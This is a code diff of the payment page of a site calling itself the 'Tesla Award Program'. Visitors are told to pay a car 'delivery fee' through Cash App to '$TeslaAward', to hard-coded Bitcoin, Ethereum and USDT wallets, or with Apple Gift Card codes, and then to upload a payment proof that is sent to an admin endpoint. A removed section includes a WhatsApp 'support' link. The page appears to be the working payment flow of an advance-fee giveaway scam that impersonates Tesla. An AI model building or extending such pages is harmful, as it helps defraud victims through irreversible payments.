+        { id:'paypal', name:'paypal', display_name:'PayPal', type:'wallet', icon_emoji:'💳', enabled:true, sort_order:1, wallet_address:'', payment_instructions:'Send payment to our PayPal account. Include your Order ID in the notes.' },
+        { id:'cashapp', name:'cashapp', display_name:'Cash App', type:'wallet', icon_emoji:'💵', enabled:true, sort_order:2, wallet_address:'$TeslaAward', payment_instructions:'Send payment to $TeslaAward on Cash App. Include your Order ID.' },
+        { id:'bitcoin', name:'bitcoin', display_name:'Bitcoin (BTC)', type:'crypto', icon_emoji:'₿', enabled:true, sort_order:3, wallet_address:'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh', payment_instructions:'Send BTC to the wallet address shown. Network fees may apply.' },
+        { id:'ethereum', name:'ethereum', display_name:'Ethereum (ETH)', type:'crypto', icon_emoji:'♦', enabled:true, sort_order:4, wallet_address:'0x742d35Cc6634C0532925a3b844Bc9e7595f2bD18', payment_instructions:'Send ETH to the wallet address shown. Ensure you use the Ethereum network.' },
+        { id:'usdt', name:'usdt', display_name:'USDT (Tether)', type:'crypto', icon_emoji:'💎', enabled:true, sort_order:5, wallet_address:'TXn7vGJqLjwFYzRKUvR7qJAMfJbGGzLKVL', payment_instructions:'Send USDT (TRC-20) to the wallet address shown.' },
+        { id:'creditcard', name:'creditcard', display_name:'Credit Card', type:'card', icon_emoji:'🏦', enabled:true, sort_order:6, wallet_address:'', payment_instructions:'Pay securely using your credit or debit card. We accept Visa, Mastercard, and Amex.' },
+        { id:'applegift', name:'applegift', display_name:'Apple Gift Card', type:'gift', icon_emoji:'🍎', enabled:true, sort_order:7, wallet_address:'', payment_instructions:'Send Apple Gift Card code. Include the code in your upload notes.' }
+      ];
+      localStorage.setItem('tesla_payment_methods', JSON.stringify(paymentMethods));
+    }
+    renderPaymentMethods();
+    renderOrderSummary();
+  }
 
-window.processPayment=function(){
-  if(!sp){if(typeof showToast==='function')showToast('Please select a payment method.','error');return;}
-  if(!st){st=localStorage.getItem('tesla_session_token')||(typeof getSession==='function'?getSession():'');}
-  // Store selected payment method and redirect to payment-details page
-  var pm=paymentMethods.find(function(m){return m.id===sp})||{id:sp,name:sp};
-  localStorage.setItem('tesla_selected_payment',JSON.stringify(pm));
-  // Also try to create the order via API
-  var doApiCall=(typeof apiCall==='function')?apiCall:function(e,m,b){m=m||'POST';var B=(typeof window!=='undefined'&&window.TESLA_API_BASE)||'https://puebwzumwqizgbmksrpq.supabase.co/functions/v1/tesla-api/api';return fetch(B+e,{method:m,headers:{'Content-Type':'application/json'},body:b?JSON.stringify(b):null}).then(function(r){var ct=r.headers.get('content-type')||'';return(ct.includes('application/json')?r.json():r.text()).then(function(d){if(!r.ok){var em=typeof d==='string'?d:(d.error||d.message||'Something went wrong.');throw new Error(em);}return d;});});};
-  var btn=document.getElementById('payBtn');
-  btn.disabled=true;btn.style.opacity='0.55';btn.style.cursor='not-allowed';btn.textContent='Processing...';
-  if(typeof showLoading==='function')showLoading('Processing your order...');
-  var payload={sessionToken:st,selectedCar:sc,deliveryDetails:sd,deliveryMethod:sm,paymentMethod:{id:pm.id,name:pm.name}};
-  doApiCall('/order','POST',payload).then(function(r){
-    var ord=r.order||{};
-    localStorage.setItem('tesla_last_order',JSON.stringify(ord));
-    try{var overlay=document.getElementById('globalLoader');if(overlay)overlay.remove();}catch(e){}
-    window.location.href='payment-details.html';
-  }).catch(function(e){
-    btn.disabled=false;btn.style.opacity='1';btn.style.cursor='pointer';btn.textContent='Pay '+(sm?sm.priceDisplay:'')+' \u2014 Place Order';
-    try{var overlay=document.getElementById('globalLoader');if(overlay)overlay.remove();}catch(e2){}
-    // Still navigate even if API fails
-    window.location.href='payment-details.html';
-  });
-};
+  function renderPaymentMethods() {
+    var list = document.getElementById('paymentMethodsList');
+    if (!list) return;
+    var enabled = paymentMethods.filter(function(pm) { return pm.enabled !== false; });
+    list.innerHTML = enabled.map(function(pm) {
+      var icon = pm.icon_emoji || pm.icon || '💳';
+      var name = pm.display_name || pm.displayName || pm.name || 'Payment';
+      var isSelected = selectedPaymentId === pm.id;
+      return '<div class="other-method-card' + (isSelected ? ' selected' : '') + '" onclick="window.selectPaymentMethod(\'' + pm.id + '\')">' +
+        '<div class="om-icon">' + icon + '</div>' +
+        '<div class="om-name">' + escapeHtml(name) + '</div>' +
+        (isSelected ? '<div class="om-badge selected-badge" style="background:#E31937;color:#fff;display:inline-block;font-size:9px;font-weight:700;padding:2px 6px;border-radius:999px;margin-top:4px;">Selected</div>' : '') +
+        '</div>';
+    }).join('');
+  }
+
+  function selectPaymentMethod(id) {
+    selectedPaymentId = id;
+    renderPaymentMethods();
+    showPaymentDetails(id);
+    var submitBtn = document.getElementById('submitBtn');
+    if (submitBtn && uploadedFileData) {
+      submitBtn.disabled = false;
+      submitBtn.style.opacity = '1';
+      submitBtn.style.cursor = 'pointer';
+    }
+  }
+
+  function showPaymentDetails(id) {
+    var pm = paymentMethods.find(function(p) { return p.id === id; });
+    if (!pm) return;
+
+    var section = document.getElementById('paymentDetailSection');
+    section.style.display = 'block';
+    section.style.animation = 'slideInUp 0.3s ease';
+
+    var name = pm.display_name || pm.displayName || pm.name || 'Payment';
+    var icon = pm.icon_emoji || pm.icon || '💳';
+    var type = pm.type || 'wallet';
+    var address = pm.wallet_address || pm.walletAddress || '';
+    var instructions = pm.payment_instructions || pm.instructions || '';
+
+    document.getElementById('pmDetailTitle').textContent = name;
+    document.getElementById('pmDetailType').textContent = type.charAt(0).toUpperCase() + type.slice(1);
+
+    var iconEl = document.getElementById('pmBigIcon');
+    iconEl.textContent = icon;
+    iconEl.className = 'pay-big-icon ' + type;
+
+    var addrBox = document.getElementById('walletAddressBox');
+    var addrEl = document.getElementById('walletAddress');
+    if (address) {
+      addrBox.style.display = 'block';
+      addrEl.textContent = address;
+    } else {
+      addrBox.style.display = 'none';
+    }
+
+    var qrContainer = document.getElementById('qrContainer');
+    var qrPlaceholder = document.getElementById('qrPlaceholder');
+    var qrEmoji = document.getElementById('qrEmoji');
+    if (address && type !== 'card' && type !== 'gift') {
+      qrContainer.style.display = 'block';
+      qrPlaceholder.innerHTML = '<span style="font-size:32px;color:#ccc;">' + icon + '</span>';
+    } else {
+      qrContainer.style.display = 'none';
+    }
+
+    var instrEl = document.getElementById('paymentInstructions');
+    instrEl.textContent = instructions || 'Send the exact delivery fee amount. Include your Order ID in the payment reference.';
+
+    // Scroll to detail section
+    section.scrollIntoView({ behavior: 'smooth', block: 'start' });
+  }
+
+  function copyAddress() {
+    var addr = document.getElementById('walletAddress').textContent;
+    if (!addr || addr === '—') return;
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(addr).then(function() {
+        var btn = document.getElementById('copyAddressBtn');
+        btn.textContent = '✓ Copied!';
+        btn.classList.add('copied');
+        setTimeout(function() { btn.textContent = '📋 Copy'; btn.classList.remove('copied'); }, 2000);
+      }).catch(function() { fallbackCopy(addr); });
+    } else {
+      fallbackCopy(addr);
+    }
+  }
+
+  function fallbackCopy(text) {
+    var ta = document.createElement('textarea');
+    ta.value = text;
+    ta.style.position = 'fixed'; ta.style.opacity = '0';
+    document.body.appendChild(ta);
+    ta.select();
+    try { document.execCommand('copy'); showToast('Address copied!'); } catch(e) { showToast('Could not copy', 'error'); }
+    document.body.removeChild(ta);
+  }
+
+  function renderOrderSummary() {
+    var fee = deliveryMethod.priceDisplay || '$' + (deliveryMethod.price || '299');
+    document.getElementById('smModel').textContent = 'Tesla ' + (selectedCar.name || '');
+    document.getElementById('smMethod').textContent = deliveryMethod.name || 'Standard Delivery';
+    document.getElementById('smTime').textContent = deliveryMethod.days || '5–10 business days';
+    document.getElementById('smName').textContent = deliveryDetails.fullName || '—';
+    document.getElementById('smAddr').textContent = [deliveryDetails.address, deliveryDetails.city, deliveryDetails.state, deliveryDetails.zipCode].filter(Boolean).join(', ') || '—';
+    document.getElementById('smPhone').textContent = deliveryDetails.phone || '—';
+    document.getElementById('smTotal').textContent = fee;
+  }
+
+  // ── FILE UPLOAD ──
+  function handleFileSelect(input) {
+    var file = input.files && input.files[0];
+    if (!file) return;
+    processFile(file);
+    // Reset input so same file can be re-selected
+    input.value = '';
+  }
+
+  function processFile(file) {
+    if (!file.type.startsWith('image/')) {
+      showToast('Please select an image file (JPEG, PNG, etc.)', 'error');
+      return;
+    }
+    if (file.size > 10 * 1024 * 1024) {
+      showToast('File is too large. Maximum size is 10MB.', 'error');
+      return;
+    }
+
+    uploadedFileName = file.name;
+    var reader = new FileReader();
+    reader.onload = function(e) {
+      uploadedFileData = e.target.result;
+      showPreview(uploadedFileData, file.name, file.size);
+    };
+    reader.readAsDataURL(file);
+  }
+
+  function showPreview(dataUrl, name, size) {
+    var uploadState = document.getElementById('uploadState');
+    var preview = document.getElementById('uploadPreview');
+    uploadState.style.display = 'none';
+    preview.classList.add('show');
+    preview.style.display = 'block';
+
+    document.getElementById('previewImage').src = dataUrl;
+    document.getElementById('previewFileName').textContent = name || 'Receipt';
+    document.getElementById('previewFileSize').textContent = size ? formatSize(size) : '';
+
+    // Enable submit button if payment method is selected
+    var submitBtn = document.getElementById('submitBtn');
+    if (submitBtn && selectedPaymentId) {
+      submitBtn.disabled = false;
+      submitBtn.style.opacity = '1';
+      submitBtn.style.cursor = 'pointer';
+    }
+  }
+
+  function resetUpload() {
+    uploadedFileData = null;
+    uploadedFileName = '';
+    var uploadState = document.getElementById('uploadState');
+    var preview = document.getElementById('uploadPreview');
+    uploadState.style.display = 'block';
+    preview.classList.remove('show');
+    preview.style.display = 'none';
+
+    var submitBtn = document.getElementById('submitBtn');
+    submitBtn.disabled = true;
+    submitBtn.style.opacity = '.5';
+    submitBtn.style.cursor = 'not-allowed';
+  }
+
+  function openCamera() {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      // Fallback to file picker with camera
+      var cameraInput = document.getElementById('cameraInput');
+      if (cameraInput) cameraInput.click();
+      return;
+    }
+    // Try using the capture attribute approach
+    var cameraInput = document.getElementById('cameraInput');
+    if (cameraInput) cameraInput.click();
+  }
+
+  function formatSize(bytes) {
+    if (bytes < 1024) return bytes + ' B';
+    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
+    return (bytes / 1048576).toFixed(1) + ' MB';
+  }
+
+  function confirmUpload() {
+    if (!uploadedFileData) { showToast('No file selected', 'error'); return; }
+    showUploadStatus('✅ Payment proof uploaded successfully!', 'success');
+    showToast('Proof uploaded — you can now complete your order');
+    var submitBtn = document.getElementById('submitBtn');
+    if (submitBtn && selectedPaymentId) {
+      submitBtn.disabled = false;
+      submitBtn.style.opacity = '1';
+      submitBtn.style.cursor = 'pointer';
+    }
+  }
+
+  function showUploadStatus(msg, type) {
+    var status = document.getElementById('uploadStatus');
+    status.style.display = 'block';
+    status.textContent = msg;
+    status.style.background = type === 'success' ? 'rgba(0,165,80,.08)' : 'rgba(239,68,68,.08)';
+    status.style.color = type === 'success' ? 'var(--success)' : 'var(--danger)';
+    status.style.border = '1px solid ' + (type === 'success' ? 'rgba(0,165,80,.2)' : 'rgba(239,68,68,.2)');
+  }
+
+  // ── SUBMIT ──
+  function submitPayment() {
+    if (!selectedPaymentId) { showToast('Please select a payment method', 'error'); return; }
+    if (!uploadedFileData) { showToast('Please upload your payment proof first', 'error'); return; }
+
+    var pm = paymentMethods.find(function(p) { return p.id === selectedPaymentId; });
+    var pmName = pm ? (pm.display_name || pm.displayName || pm.name || selectedPaymentId) : selectedPaymentId;
+
+    // Save payment proof to localStorage
+    var proofs = [];
+    try { proofs = JSON.parse(localStorage.getItem('tesla_payment_proofs') || '[]'); } catch(e) {}
+    var proof = {
+      id: 'proof_' + Date.now(),
+      user_id: 'customer',
+      order_id: 'TSLA-' + Date.now().toString(36).toUpperCase(),
+      payment_method: pmName,
+      proof_url: uploadedFileData,
+      proof_type: 'image',
+      amount: deliveryMethod.priceDisplay || '$' + (deliveryMethod.price || '299'),
+      status: 'pending',
+      created_at: new Date().toISOString()
+    };
+    proofs.unshift(proof);
+    localStorage.setItem('tesla_payment_proofs', JSON.stringify(proofs));
+
+    // Save as last order
+    var orderData = {
+      orderId: proof.order_id,
+      trackingNumber: 'TRK-' + Math.random().toString(36).substring(2, 10).toUpperCase(),
+      email: deliveryDetails.email || '',
+      entryId: 'entry_' + Date.now(),
+      selectedCar: selectedCar,
+      deliveryDetails: deliveryDetails,
+      deliveryMethod: deliveryMethod,
+      paymentMethod: { id: selectedPaymentId, name: pmName },
+      status: 'awaiting_payment_confirmation',
+      orderDate: new Date().toISOString(),
+      estimatedDelivery: deliveryMethod.days || '5–10 business days'
+    };
+    localStorage.setItem('tesla_last_order', JSON.stringify(orderData));
+
+    // Try API call if available
+    var API_BASE = (typeof window.TESLA_API_BASE !== 'undefined' && window.TESLA_API_BASE)
+      ? window.TESLA_API_BASE.replace(/\/+$/, '') : '';
+
+    if (API_BASE) {
+      // Submit to API (best effort)
+      var controller = new AbortController();
+      var timeout = setTimeout(function() { controller.abort(); }, 10000);
+      fetch(API_BASE + '/order', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          sessionToken: sessionToken,
+          selectedCar: selectedCar,
+          deliveryDetails: deliveryDetails,
+          deliveryMethod: deliveryMethod,
+          paymentMethod: { id: selectedPaymentId, name: pmName }
+        })
+      }).then(function(r) { return r.json(); }).then(function(r) {
+        if (r.order) {
+          localStorage.setItem('tesla_last_order', JSON.stringify(r.order));
+        }
+      }).catch(function() {}).finally(function() { clearTimeout(timeout); });
+
+      // Also submit payment proof
+      fetch(API_BASE + '/admin/payment-proofs/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(proof)
+      }).catch(function() {});
+    }
+
+    // Redirect to order confirmation
+    window.location.href = 'order-placed.html';
+  }
+
+  // ── HELPERS ──
+  function escapeHtml(str) {
+    if (str == null) return '';
+    var d = document.createElement('div');
+    d.textContent = String(str);
+    return d.innerHTML;
+  }
+
+  function showToast(msg, type) {
+    type = type || 'success';
+    if (typeof window.showToast === 'function') {
+      window.showToast(msg, type);
+      return;
+    }
+    var existing = document.querySelectorAll('.toast-notif');
+    for (var i = 0; i < existing.length; i++) existing[i].remove();
+    var t = document.createElement('div');
+    t.className = 'toast-notif toast-' + type;
+    var icons = { success: '✓', error: '✕', info: 'ℹ', warning: '⚠' };
+    t.innerHTML = '<span class="toast-icon">' + (icons[type] || '✓') + '</span><span class="toast-msg">' + msg + '</span>';
+    t.style.cssText = 'position:fixed;bottom:24px;right:24px;z-index:99999;display:flex;align-items:center;gap:12px;padding:14px 22px;border-radius:12px;font-size:14px;font-weight:500;max-width:380px;box-shadow:0 12px 40px rgba(0,0,0,.2);animation:slideInRight .35s ease;color:white;background:' + (type === 'error' ? '#EF4444' : type === 'warning' ? '#F59E0B' : '#171A20') + ';';
+    document.body.appendChild(t);
+    setTimeout(function() { t.style.opacity = '0'; t.style.transform = 'translateX(20px)'; t.style.transition = 'opacity .35s ease, transform .35s ease'; setTimeout(function() { if (t.parentNode) t.remove(); }, 350); }, 5000);
+  }
+
+  // ── INIT ──
+  window.selectPaymentMethod = selectPaymentMethod;
+  window.copyAddress = copyAddress;
+  window.handleFileSelect = handleFileSelect;
+  window.openCamera = openCamera;
+  window.resetUpload = resetUpload;
+  window.confirmUpload = confirmUpload;
+  window.submitPayment = submitPayment;
+
+  loadPaymentMethods();
+
+  // Auto-select first enabled payment method
+  var enabled = paymentMethods.filter(function(pm) { return pm.enabled !== false; });
+  if (enabled.length > 0 && !selectedPaymentId) {
+    selectPaymentMethod(enabled[0].id);
+  }
+
 })();
 </script>
-
-<div class="whatsapp-float">
-  <span class="whatsapp-label">Need help?<br>Chat with us</span>
-  <a href="https://wa.me/15814783495?text=Hi%2C%20I%20need%20support%20with%20my%20Tesla%20Award%20Program%20order." class="whatsapp-float-btn" target="_blank" rel="noopener noreferrer" title="Chat on WhatsApp">
-    <svg viewBox="0 0 24 24" fill="white"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
-  </a>
-</div>
 </body>
-<!-- build: 1784129878 -->
 </html>
